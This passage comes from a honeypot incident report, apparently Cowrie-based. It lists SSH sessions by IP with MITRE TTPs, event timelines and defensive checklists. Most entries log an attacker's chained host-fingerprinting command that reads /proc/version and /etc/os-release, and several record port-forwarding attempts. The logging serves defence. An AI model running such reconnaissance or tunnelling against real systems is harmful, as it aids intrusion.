| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]84` |
| **First Seen** | 2026-07-12 17:43 |
| **Last Seen** | 2026-07-12 17:43 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-12 17:43:13` | `cowrie.session.connect` |
| `2026-07-12 17:43:13` | `cowrie.client.version` |
| `2026-07-12 17:43:13` | `cowrie.client.kex` |
| `2026-07-12 17:43:14` | `cowrie.login.success` |
| `2026-07-12 17:43:15` | `cowrie.session.params` |
| `2026-07-12 17:43:15` | `cowrie.command.input` |
| `2026-07-12 17:43:15` | `cowrie.command.input` |
| `2026-07-12 17:43:15` | `cowrie.command.input` |
| `2026-07-12 17:43:15` | `cowrie.command.input` |
| `2026-07-12 17:43:15` | `cowrie.command.input` |
| `2026-07-12 17:43:15` | `cowrie.command.success` |
| `2026-07-12 17:43:15` | `cowrie.command.input` |
| `2026-07-12 17:43:15` | `cowrie.command.input` |
| `2026-07-12 17:43:15` | `cowrie.command.input` |
| `2026-07-12 17:43:15` | `cowrie.command.input` |
| `2026-07-12 17:43:16` | `cowrie.log.closed` |
| `2026-07-12 17:43:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]84` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]84` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c72d721defab

| Field | Detail |
|---|---|
| **Source IP** | `101.13.5[.]26` |
| **First Seen** | 2026-07-12 17:43 |
| **Last Seen** | 2026-07-12 17:43 |
| **Session Duration** | 17s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-12 17:43:17` | `cowrie.session.connect` |
| `2026-07-12 17:43:19` | `cowrie.client.version` |
| `2026-07-12 17:43:19` | `cowrie.client.kex` |
| `2026-07-12 17:43:27` | `cowrie.login.success` |
| `2026-07-12 17:43:29` | `cowrie.direct-tcpip.request` |
| `2026-07-12 17:43:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.13.5[.]26` to AbuseIPDB if not already reported
- [ ] Block `101.13.5[.]26` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b55c7f11da12

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]232` |
| **First Seen** | 2026-07-12 17:43 |
| **Last Seen** | 2026-07-12 17:43 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-12 17:43:23` | `cowrie.session.connect` |
| `2026-07-12 17:43:24` | `cowrie.client.version` |
| `2026-07-12 17:43:24` | `cowrie.client.kex` |
| `2026-07-12 17:43:27` | `cowrie.login.success` |
| `2026-07-12 17:43:28` | `cowrie.session.params` |
| `2026-07-12 17:43:28` | `cowrie.command.input` |
| `2026-07-12 17:43:28` | `cowrie.command.input` |
| `2026-07-12 17:43:28` | `cowrie.command.input` |
| `2026-07-12 17:43:28` | `cowrie.command.input` |
| `2026-07-12 17:43:28` | `cowrie.command.input` |
| `2026-07-12 17:43:28` | `cowrie.command.success` |
| `2026-07-12 17:43:28` | `cowrie.command.input` |
| `2026-07-12 17:43:28` | `cowrie.command.input` |
| `2026-07-12 17:43:28` | `cowrie.command.input` |
| `2026-07-12 17:43:28` | `cowrie.command.input` |
| `2026-07-12 17:43:29` | `cowrie.log.closed` |
| `2026-07-12 17:43:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]232` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]232` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-36781e6690f2

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]176` |
| **First Seen** | 2026-07-12 17:43 |
| **Last Seen** | 2026-07-12 17:43 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-12 17:43:31` | `cowrie.session.connect` |
| `2026-07-12 17:43:31` | `cowrie.client.version` |
| `2026-07-12 17:43:31` | `cowrie.client.kex` |
| `2026-07-12 17:43:32` | `cowrie.login.success` |
| `2026-07-12 17:43:33` | `cowrie.session.params` |
| `2026-07-12 17:43:33` | `cowrie.command.input` |
| `2026-07-12 17:43:33` | `cowrie.command.input` |
| `2026-07-12 17:43:33` | `cowrie.command.input` |
| `2026-07-12 17:43:33` | `cowrie.command.input` |
| `2026-07-12 17:43:33` | `cowrie.command.input` |
| `2026-07-12 17:43:33` | `cowrie.command.success` |
| `2026-07-12 17:43:33` | `cowrie.command.input` |
| `2026-07-12 17:43:33` | `cowrie.command.input` |
| `2026-07-12 17:43:33` | `cowrie.command.input` |
| `2026-07-12 17:43:33` | `cowrie.command.input` |
| `2026-07-12 17:43:34` | `cowrie.log.closed` |
| `2026-07-12 17:43:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]176` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]176` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3ba9109455fb

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]232` |
| **First Seen** | 2026-07-12 17:45 |
| **Last Seen** | 2026-07-12 17:45 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-12 17:45:21` | `cowrie.session.connect` |
| `2026-07-12 17:45:22` | `cowrie.client.version` |
| `2026-07-12 17:45:22` | `cowrie.client.kex` |
| `2026-07-12 17:45:26` | `cowrie.login.success` |
| `2026-07-12 17:45:27` | `cowrie.session.params` |
| `2026-07-12 17:45:27` | `cowrie.command.input` |
| `2026-07-12 17:45:27` | `cowrie.command.input` |
| `2026-07-12 17:45:27` | `cowrie.command.input` |
| `2026-07-12 17:45:27` | `cowrie.command.input` |
| `2026-07-12 17:45:27` | `cowrie.command.input` |
| `2026-07-12 17:45:27` | `cowrie.command.success` |
| `2026-07-12 17:45:27` | `cowrie.command.input` |
| `2026-07-12 17:45:27` | `cowrie.command.input` |
| `2026-07-12 17:45:27` | `cowrie.command.input` |
| `2026-07-12 17:45:27` | `cowrie.command.input` |
| `2026-07-12 17:45:28` | `cowrie.log.closed` |
| `2026-07-12 17:45:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]232` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]232` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3f5a751cfdf8

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]84` |
| **First Seen** | 2026-07-12 17:45 |
| **Last Seen** | 2026-07-12 17:45 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-12 17:45:30` | `cowrie.session.connect` |
| `2026-07-12 17:45:30` | `cowrie.client.version` |
| `2026-07-12 17:45:30` | `cowrie.client.kex` |
| `2026-07-12 17:45:31` | `cowrie.login.success` |
| `2026-07-12 17:45:32` | `cowrie.session.params` |
| `2026-07-12 17:45:32` | `cowrie.command.input` |
| `2026-07-12 17:45:32` | `cowrie.command.input` |
| `2026-07-12 17:45:32` | `cowrie.command.input` |
| `2026-07-12 17:45:32` | `cowrie.command.input` |
| `2026-07-12 17:45:32` | `cowrie.command.input` |
| `2026-07-12 17:45:32` | `cowrie.command.success` |
| `2026-07-12 17:45:32` | `cowrie.command.input` |
| `2026-07-12 17:45:32` | `cowrie.command.input` |
| `2026-07-12 17:45:32` | `cowrie.command.input` |
| `2026-07-12 17:45:32` | `cowrie.command.input` |
| `2026-07-12 17:45:32` | `cowrie.log.closed` |
| `2026-07-12 17:45:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]84` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]84` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ca9e988e4e8e

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]176` |
| **First Seen** | 2026-07-12 17:45 |
| **Last Seen** | 2026-07-12 17:45 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-12 17:45:46` | `cowrie.session.connect` |
| `2026-07-12 17:45:46` | `cowrie.client.version` |
| `2026-07-12 17:45:46` | `cowrie.client.kex` |
| `2026-07-12 17:45:47` | `cowrie.login.success` |
| `2026-07-12 17:45:48` | `cowrie.session.params` |
| `2026-07-12 17:45:48` | `cowrie.command.input` |
| `2026-07-12 17:45:48` | `cowrie.command.input` |
| `2026-07-12 17:45:48` | `cowrie.command.input` |
| `2026-07-12 17:45:48` | `cowrie.command.input` |
| `2026-07-12 17:45:48` | `cowrie.command.input` |
| `2026-07-12 17:45:48` | `cowrie.command.success` |
| `2026-07-12 17:45:48` | `cowrie.command.input` |
| `2026-07-12 17:45:48` | `cowrie.command.input` |
| `2026-07-12 17:45:48` | `cowrie.command.input` |
| `2026-07-12 17:45:48` | `cowrie.command.input` |
| `2026-07-12 17:45:48` | `cowrie.log.closed` |
| `2026-07-12 17:45:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]176` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]176` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e63a9ed07ba0

| Field | Detail |
|---|---|
| **Source IP** | `203.110.233[.]225` |
| **First Seen** | 2026-07-12 17:46 |
| **Last Seen** | 2026-07-12 17:46 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-12 17:46:37` | `cowrie.session.connect` |
| `2026-07-12 17:46:38` | `cowrie.client.version` |
| `2026-07-12 17:46:38` | `cowrie.client.kex` |
| `2026-07-12 17:46:40` | `cowrie.login.success` |
| `2026-07-12 17:46:41` | `cowrie.direct-tcpip.request` |
| `2026-07-12 17:46:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `203.110.233[.]225` to AbuseIPDB if not already reported
- [ ] Block `203.110.233[.]225` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9f122a39826c

| Field | Detail |
|---|---|
| **Source IP** | `124.152.90[.]68` |
| **First Seen** | 2026-07-12 17:46 |
| **Last Seen** | 2026-07-12 17:46 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-12 17:46:47` | `cowrie.session.connect` |
| `2026-07-12 17:46:47` | `cowrie.client.version` |
| `2026-07-12 17:46:47` | `cowrie.client.kex` |
| `2026-07-12 17:46:49` | `cowrie.login.success` |
| `2026-07-12 17:46:50` | `cowrie.direct-tcpip.request` |
| `2026-07-12 17:46:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `124.152.90[.]68` to AbuseIPDB if not already reported
- [ ] Block `124.152.90[.]68` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d26ec9638856

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]232` |
| **First Seen** | 2026-07-12 17:47 |
| **Last Seen** | 2026-07-12 17:47 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-12 17:47:08` | `cowrie.session.connect` |
| `2026-07-12 17:47:10` | `cowrie.client.version` |
| `2026-07-12 17:47:10` | `cowrie.client.kex` |
| `2026-07-12 17:47:13` | `cowrie.login.success` |
| `2026-07-12 17:47:15` | `cowrie.session.params` |
| `2026-07-12 17:47:15` | `cowrie.command.input` |
| `2026-07-12 17:47:15` | `cowrie.command.input` |
| `2026-07-12 17:47:15` | `cowrie.command.input` |
| `2026-07-12 17:47:15` | `cowrie.command.input` |
| `2026-07-12 17:47:15` | `cowrie.command.input` |
| `2026-07-12 17:47:15` | `cowrie.command.success` |
| `2026-07-12 17:47:15` | `cowrie.command.input` |
| `2026-07-12 17:47:15` | `cowrie.command.input` |
| `2026-07-12 17:47:15` | `cowrie.command.input` |
| `2026-07-12 17:47:15` | `cowrie.command.input` |
| `2026-07-12 17:47:15` | `cowrie.log.closed` |
| `2026-07-12 17:47:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]232` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]232` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-69100b5a0cca

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]176` |
| **First Seen** | 2026-07-12 17:48 |
| **Last Seen** | 2026-07-12 17:48 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-12 17:48:00` | `cowrie.session.connect` |
| `2026-07-12 17:48:01` | `cowrie.client.version` |
| `2026-07-12 17:48:01` | `cowrie.client.kex` |
| `2026-07-12 17:48:02` | `cowrie.login.success` |
| `2026-07-12 17:48:04` | `cowrie.session.params` |
| `2026-07-12 17:48:04` | `cowrie.command.input` |
| `2026-07-12 17:48:04` | `cowrie.command.input` |
| `2026-07-12 17:48:04` | `cowrie.command.input` |
| `2026-07-12 17:48:04` | `cowrie.command.input` |
| `2026-07-12 17:48:04` | `cowrie.command.input` |
| `2026-07-12 17:48:04` | `cowrie.command.success` |
| `2026-07-12 17:48:04` | `cowrie.command.input` |
| `2026-07-12 17:48:04` | `cowrie.command.input` |
| `2026-07-12 17:48:04` | `cowrie.command.input` |
| `2026-07-12 17:48:04` | `cowrie.command.input` |
| `2026-07-12 17:48:04` | `cowrie.log.closed` |
| `2026-07-12 17:48:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]176` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]176` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-91c646e2dd54

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]84` |
| **First Seen** | 2026-07-12 17:48 |
| **Last Seen** | 2026-07-12 17:48 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-12 17:48:01` | `cowrie.session.connect` |
| `2026-07-12 17:48:01` | `cowrie.client.version` |
| `2026-07-12 17:48:02` | `cowrie.client.kex` |
| `2026-07-12 17:48:02` | `cowrie.login.success` |
| `2026-07-12 17:48:03` | `cowrie.session.params` |
| `2026-07-12 17:48:03` | `cowrie.command.input` |
| `2026-07-12 17:48:03` | `cowrie.command.input` |
| `2026-07-12 17:48:03` | `cowrie.command.input` |
| `2026-07-12 17:48:03` | `cowrie.command.input` |
| `2026-07-12 17:48:03` | `cowrie.command.input` |
| `2026-07-12 17:48:03` | `cowrie.command.success` |
| `2026-07-12 17:48:03` | `cowrie.command.input` |
| `2026-07-12 17:48:03` | `cowrie.command.input` |
| `2026-07-12 17:48:03` | `cowrie.command.input` |
| `2026-07-12 17:48:03` | `cowrie.command.input` |
| `2026-07-12 17:48:04` | `cowrie.log.closed` |
| `2026-07-12 17:48:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]84` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]84` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0544b9eb3655

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]232` |
| **First Seen** | 2026-07-12 17:49 |
| **Last Seen** | 2026-07-12 17:49 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-12 17:49:01` | `cowrie.session.connect` |
| `2026-07-12 17:49:03` | `cowrie.client.version` |
| `2026-07-12 17:49:03` | `cowrie.client.kex` |
| `2026-07-12 17:49:06` | `cowrie.login.success` |
| `2026-07-12 17:49:07` | `cowrie.session.params` |
| `2026-07-12 17:49:07` | `cowrie.command.input` |
| `2026-07-12 17:49:07` | `cowrie.command.input` |
| `2026-07-12 17:49:07` | `cowrie.command.input` |
| `2026-07-12 17:49:07` | `cowrie.command.input` |
| `2026-07-12 17:49:07` | `cowrie.command.input` |
| `2026-07-12 17:49:07` | `cowrie.command.success` |
| `2026-07-12 17:49:07` | `cowrie.command.input` |
| `2026-07-12 17:49:07` | `cowrie.command.input` |
| `2026-07-12 17:49:07` | `cowrie.command.input` |
| `2026-07-12 17:49:07` | `cowrie.command.input` |
| `2026-07-12 17:49:07` | `cowrie.log.closed` |
| `2026-07-12 17:49:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]232` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]232` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-99e912e22441

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]176` |
| **First Seen** | 2026-07-12 17:50 |
| **Last Seen** | 2026-07-12 17:50 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-12 17:50:13` | `cowrie.session.connect` |
| `2026-07-12 17:50:13` | `cowrie.client.version` |
| `2026-07-12 17:50:13` | `cowrie.client.kex` |
| `2026-07-12 17:50:14` | `cowrie.login.success` |
| `2026-07-12 17:50:15` | `cowrie.session.params` |
| `2026-07-12 17:50:15` | `cowrie.command.input` |
| `2026-07-12 17:50:15` | `cowrie.command.input` |
| `2026-07-12 17:50:15` | `cowrie.command.input` |
